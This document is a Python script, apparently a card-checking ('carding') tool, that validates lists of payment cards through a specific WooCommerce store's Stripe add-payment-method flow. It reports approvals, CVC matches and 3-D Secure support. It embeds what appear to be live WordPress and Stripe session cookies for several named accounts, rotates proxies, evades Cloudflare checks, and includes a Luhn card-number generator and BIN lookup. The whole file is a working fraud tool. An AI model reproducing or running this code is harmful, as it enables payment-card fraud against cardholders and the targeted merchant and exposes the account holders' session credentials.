import cloudscraper
import re
import time
import random
import uuid
import requests
import os
import sys
from datetime import datetime
from colorama import Fore, Style, init

init(autoreset=True)

# --- NEON COLOR PALETTE ---
C = Fore.LIGHTCYAN_EX
M = Fore.LIGHTMAGENTA_EX
Y = Fore.LIGHTYELLOW_EX
W = Fore.LIGHTWHITE_EX
R = Fore.LIGHTRED_EX
G = Fore.LIGHTGREEN_EX

# --- LOADING ANIMATION ---
def loading_animation(card, task_name):
    chars = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    for i in range(12):
        char = chars[i % len(chars)]
        sys.stdout.write(f'\r{W}[{M}{char}{W}] {C}{task_name}: {W}{card} {Y}Processing...')
        sys.stdout.flush()
        time.sleep(0.08)
    sys.stdout.write('\r' + ' ' * 100 + '\r')

# --- BANNER ---
def print_banner():
    banner = f"""
    {C}    ____  __   _  __   _____ _______ ____  _________  ______
       / __ \/ /  | |/_/  / ___//_  __/ __ \/  _/ __ \/ ____/
      / / / / /   |  /    \__ \  / / / /_/ // // /_/ / __/   
     / /_/ / /___ /  |   ___/ / / / / _, _// // ____/ /___   
    /_____/_____/_/|_|  /____/ /_/ /_/ |_/___/_/   /_____/   
    {M}          >> PREİMUM STRIPE AUTH & VBV CHECKER <<
    {W}      Channel: https://t.me/+ARqILQuYOckyMzQ8
    """
    print(banner)

# --- ACCOUNT POOL ---
ACCOUNT_POOL = [
    {
        'name': 'Xray Xlea',
        'cookies': {
            '_ga': 'GA1.2.493930677.1768140612',
            '__stripe_mid': '66285028-f520-443b-9655-daf7134b8b855e5f16',
            'wordpress_logged_in_9f53720c758e9816a2dcc8ca08e321a9': 'xrayxlea%7C1769350388%7CxGcUPPOJgEHPSWiTK6F9YZpA6v4AgHki1B2Hxp0Zah5%7C3b8f3e6911e25ea6cccc48a4a0be35ed25e0479c9e90ccd2f16aa41cac04277d',
            'wfwaf-authcookie-69aad1faf32f3793e60643cdfdc85e58': '7670%7Cother%7Cread%7Cb723e85c048d2147e793e6640d861ae4f4fddd513abc1315f99355cf7d2bc455',
            '__cf_bm': 'rd1MFUeDPNtBzTZMChisPSRIJpZKLlo5dgif0o.e_Xw-1769258154-1.0.1.1-zhaKFI8L0JrFcuTzj.N9OkQvBuz6HvNmFFKCSqfn_gE2EF3GD65KuZoLGPuEhRyVwkKakMr_mcjUehEY1mO9Kb9PKq1x5XN41eXwXQavNyk',
            '__stripe_sid': '4f84200c-3b60-4204-bbe8-adc3286adebca426c8',
        }
    },
    {
        'name': 'Yasin Akbulut',
        'cookies': {
            '__cf_bm': 'zMehglRiFuX3lzj170gpYo3waDHipSMK0DXxfB63wlk-1769340288-1.0.1.1-ppt5LELQNDnJzFl1hN13LWwuQx5ZFdMS9b0SP4A3j7kasxaqEBMgSJ3vu9AbzyFOlbCozpAr.hE.g3xFpU_juaLp1heupyxmSrmte1Gn7g0',
            'wordpress_logged_in_9f53720c758e9816a2dcc8ca08e321a9': 'akbulutyasin836%7C1770549977%7CwdF5vz1qFXPSxofozNx9OwxFdmIoSdQKxaHlkOkjL2o%7C4d5f40c1bf01e0ccd6a59fdf08eb8f5aeb609c05d4d19fe41419a82433ffc1fa',
            '__stripe_mid': '2d2e501a-542d-4635-98ec-e9b2ebe26b4c9ac02a',
            '__stripe_sid': 'b2c6855b-7d29-4675-8fe4-b5c4797045132b8dea',
            'wfwaf-authcookie-69aad1faf32f3793e60643cdfdc85e58': '8214%7Cother%7Cread%7Cde5fd05c6afc735d5df323de21ff23f598bb5e1893cb9a7de451b7a8d50dc782',
        }
    },
    {
        'name': 'Mehmet Demir',
        'cookies': {
            '__cf_bm': 'zMehglRiFuX3lzj170gpYo3waDHipSMK0DXxfB63wlk-1769340288-1.0.1.1-ppt5LELQNDnJzFl1hN13LWwuQx5ZFdMS9b0SP4A3j7kasxaqEBMgSJ3vu9AbzyFOlbCozpAr.hE.g3xFpU_juaLp1heupyxmSrmte1Gn7g0',
            'wordpress_logged_in_9f53720c758e9816a2dcc8ca08e321a9': 'akbulutyasin836%7C1770549977%7CwdF5vz1qFXPSxofozNx9OwxFdmIoSdQKxaHlkOkjL2o%7C4d5f40c1bf01e0ccd6a59fdf08eb8f5aeb609c05d4d19fe41419a82433ffc1fa',
            '__stripe_mid': '2d2e501a-542d-4635-98ec-e9b2ebe26b4c9ac02a',
            '__stripe_sid': 'b2c6855b-7d29-4675-8fe4-b5c4797045132b8dea',
            'sbjs_migrations': '1418474375998%3D1',
        }
    },
    {
        'name': 'Ahmet Aksoy',
        'cookies': {
            '__cf_bm': 'aidh4Te7pipYMK.tLzhoGhXGelOgYCnYQJ525DEIqNM-1769341631-1.0.1.1-HSRHKAbOct2k1bbWIIdIN7b5fzWFydAtRqz2W0pAdRXrbVusNthJCJvU5fc7d3RkZEOZ5ZXZghJ4J2jmYzIcdJGDbb90txn4HPgSKJ6neA8',
            '_ga': 'GA1.2.1596026899.1769341671',
            '_gid': 'GA1.2.776441.1769341671',
            '__stripe_mid': '1b0100cd-503c-4665-b43b-3f5eb8b4edcdaae8bd',
            '__stripe_sid': '0f1ce17f-f7a9-4d26-bd37-52d402d30d1a8716bf',
            'wordpress_logged_in_9f53720c758e9816a2dcc8ca08e321a9': 'ahmetaksoy2345%7C1770551236%7CGF3svY4oh1UiTMXJ9iUXXuXtimHSG6PHiW0Sm5wrDbt%7Ce810ede4e1743cd73dc8dacdd56598ecf4ceaa383052d9b50d1bbd6c02da7237',
            'wfwaf-authcookie-69aad1faf32f3793e60643cdfdc85e58': '8216%7Cother%7Cread%7C70f37e1a77141c049acd75715a8d1aef6d47b285656c907c79392a55e787d97e',
        }
    },
    {
        'name': 'Dlallah',
        'cookies': {
            '__cf_bm': 'nwW.aCdcJXW8SAKZYpmEuqU6gCsNM1ibgP9mNKqXuYw-1769341811-1.0.1.1-hkeF4QihuQfbJD7DRqQcILcMycgxTqxxHcqwsU6oR8WsdViGcVMbX0CHqmx76N8wUEuIQwLFooNTm2gjGrRCKlURh4vf1ghD3gkz18KjyWg',
            '__stripe_mid': 'c7368749-b4fc-4876-bb97-bc07cc8a36b5851848',
            '__stripe_sid': 'b9d4dfb2-bba4-4ee6-9c72-8acf6acfe138efd65d',
            '_ga': 'GA1.2.1162515809.1769341851',
            'wordpress_logged_in_9f53720c758e9816a2dcc8ca08e321a9': 'dlallah%7C1770551422%7CiMfIpOcXTEo2Y9rmVMf3Mpf0kpkC4An81IgT0ZfMLff%7C01fbc5549954aa84d4f1b6c62bc44ebe65df58be0b82014d1b246c220d361231',
            'wfwaf-authcookie-69aad1faf32f3793e60643cdfdc85e58': '8217%7Cother%7Cread%7C24531823e5d32b0ad918bef860997fced3f0b92cce7ba200e3a753e050b546d3',
        }
    }
]

ULTRA_HEADERS = {
    'authority': 'associationsmanagement.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'accept-language': 'en-US,en;q=0.9',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}

# --- 5 API BIN ENGINE ---
def get_bin_info(n):
    n = n.replace(" ", "")[:8]
    apis = [
        f"https://lookup.binlist.net/{n}",
        f"https://data.handyapi.com/bin/{n[:6]}",
        f"https://api.bincheck.io/bin/{n[:6]}",
        f"https://projectsloth.io/bin/{n[:6]}",
        f"https://fayderal.site/api/bin/{n[:6]}"
    ]
    for api in apis:
        try:
            r = requests.get(api, timeout=4)
            if r.status_code == 200:
                data = r.json()
                brand = (data.get('scheme') or data.get('brand') or 'N/A').upper()
                bank = (data.get('bank', {}).get('name') or data.get('Bank') or 'N/A').upper()
                country = (data.get('country', {}).get('name') or 'N/A').upper()
                emoji = data.get('country', {}).get('emoji') or '🏳️'
                return f"{brand} | {bank} | {country} {emoji}"
        except: continue
    return "BIN INFO NOT FOUND"

# --- STRIPE ENGINE (FIXED) ---
def stripe_engine(card_line, proxy=None, mode="auth"):
    try:
        loading_animation(card_line, "STRIPE")
        
        n, mm, yy, cvc = [x.strip() for x in card_line.split('|')]
        yy = f"20{yy[-2:]}" if len(yy) <= 2 else yy
        acc = random.choice(ACCOUNT_POOL)
        bin_meta = get_bin_info(n)
        
        scraper = cloudscraper.create_scraper(browser={'browser': 'chrome', 'platform': 'android', 'mobile': True})
        if proxy and len(proxy) > 5:
            scraper.proxies.update({"http": f"http://{proxy}", "https": f"http://{proxy}"})
        
        scraper.cookies.update(acc['cookies'])
        scraper.headers.update(ULTRA_HEADERS)

        # 1. Page Connect
        r_page = scraper.get("https://associationsmanagement.com/my-account/add-payment-method/", timeout=25)
        pk_live = re.search(r'pk_live_[a-zA-Z0-9]+', r_page.text).group(0)
        addnonce = re.search(r'"createAndConfirmSetupIntentNonce":"([a-z0-9]+)"', r_page.text).group(1)

        time.sleep(random.uniform(2.5, 3.5))

        #
        stripe_hd = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': ULTRA_HEADERS['user-agent'],
        }

        #
        stripe_payload = (
            f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}'
            f'&billing_details[name]={acc["name"].replace(" ", "+")}'
            f'&billing_details[address][postal_code]=10001'
            f'&key={pk_live}'
            f'&muid={acc["cookies"].get("__stripe_mid", str(uuid.uuid4()))}'
            f'&sid={acc["cookies"].get("__stripe_sid", str(uuid.uuid4()))}'
            f'&guid={str(uuid.uuid4())}'
            f'&payment_user_agent=stripe.js%2F8f77e26090%3B+stripe-js-v3%2F8f77e26090%3B+checkout'
            f'&time_on_page={random.randint(90000, 150000)}'
        )

        r_stripe_req = scraper.post('https://api.stripe.com/v1/payment_methods', headers=stripe_hd, data=stripe_payload)
        r_stripe = r_stripe_req.json()

        if 'id' not in r_stripe:
            err = r_stripe.get('error', {}).get('message', 'Radar Security Block')
            return f"{R}Declined -> {err} | {bin_meta}"

        if mode == "vbv":
            vbv_status = r_stripe.get('card', {}).get('three_d_secure_usage', {}).get('supported', 'unknown')
            return f"{C}VBV: {str(vbv_status).upper()} | {bin_meta}"

        # 3. Final Ajax
        ajax_data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': r_stripe['id'],
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': addnonce,
        }
        r_ajax = scraper.post('https://associationsmanagement.com/wp-admin/admin-ajax.php', data=ajax_data, timeout=20).text
        
        if '"success":true' in r_ajax.lower() or 'insufficient_funds' in r_ajax.lower(): 
            return f"{G}Approved ✅ | {bin_meta}"
        if 'incorrect_cvc' in r_ajax.lower(): 
            return f"{Y}CVC Matched ✅ | {bin_meta}"
        
        reason = re.search(r'message\":\"(.*?)\"', r_ajax)
        return f"{R}Declined -> {reason.group(1) if reason else 'Rejected'} | {bin_meta}"

    except Exception as e: return f"{R}System Error: {str(e)[:50]}"

# --- LUHN GEN ---
def luhn_generate(bin_prefix, length):
    card = [int(d) for d in bin_prefix]
    while len(card) < length - 1: card.append(random.randint(0, 9))
    digits = card[::-1]
    total = sum(d if i % 2 != 0 else (d*2 if d*2 < 10 else d*2-9) for i, d in enumerate(digits))
    card.append((10 - (total % 10)) % 10)
    return ''.join(map(str, card))

def lunch_gen_tool():
    print(f"\n{M}--- LUNCH GEN SYSTEM (NEON) ---")
    bin_in = input(f"{Y}Enter BIN (6-8 digits): ").strip()
    if not bin_in.isdigit(): return print(f"{R}Invalid BIN")
    count = int(input(f"{Y}Count: "))
    is_amex = bin_in.startswith(("34", "37"))
    for _ in range(count):
        c_num = luhn_generate(bin_in, 15 if is_amex else 16)
        print(f"{W}{c_num}|{random.randint(1,12):02d}|{datetime.now().year + random.randint(1, 6)}|{random.randint(1000,9999) if is_amex else random.randint(100,999)}")
    input(f"\n{C}Finished. Press Enter...")

# --- MAIN ---
def main():
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print_banner()
        print(f"{W}[1] Auth Gate  [2] VBV Check  [3] BIN Lookup  [4] Lunch Gen  [0] Exit")
        choice = input(f"\n{Y}Choice: ").strip()
        if choice == '0': break
        if choice == '3':
            b = input(f"{Y}Enter BIN: ").strip()
            if b: 
                loading_animation(b, "BIN LOOKUP")
                print(f"{C}Result: {get_bin_info(b)}")
            input("\nPress Enter..."); continue
        if choice == '4': lunch_gen_tool(); continue

        px_input = input(f"{Y}Proxy (Enter for Direct / .txt for file): ").strip()
        proxies = []
        if os.path.isfile(px_input):
            with open(px_input, 'r') as f: proxies = [l.strip() for l in f.readlines() if l.strip()]
        elif px_input: proxies = [px_input]

        print(f"\n{C}Cards (Path .txt or Paste cards and press ENTER TWICE to start):")
        cards = []
        input_lines = []
        while True:
            line = sys.stdin.readline().strip()
            if not line: break
            input_lines.append(line)

        for item in input_lines:
            if os.path.isfile(item):
                with open(item, 'r') as f: cards.extend([l.strip() for l in f.readlines() if '|' in l])
            elif '|' in item:
                cards.append(item)

        if not cards:
            print(f"{R}No valid cards provided!"); time.sleep(2); continue

        print(f"\n{M}Starting Check: {W}{len(cards)} cards in queue...\n")
        
        for i, card in enumerate(cards):
            px = proxies[i % len(proxies)] if proxies else None
            if choice == '1': res = stripe_engine(card, px, "auth")
            elif choice == '2': res = stripe_engine(card, px, "vbv")
            else: res = f"{R}Choice Error"
            
            print(f"{W}[{card}] -> {res}")
            time.sleep(1.2) 

        input(f"\n{C}Batch Finished. Press Enter to return to menu...")

if __name__ == "__main__":
    main()
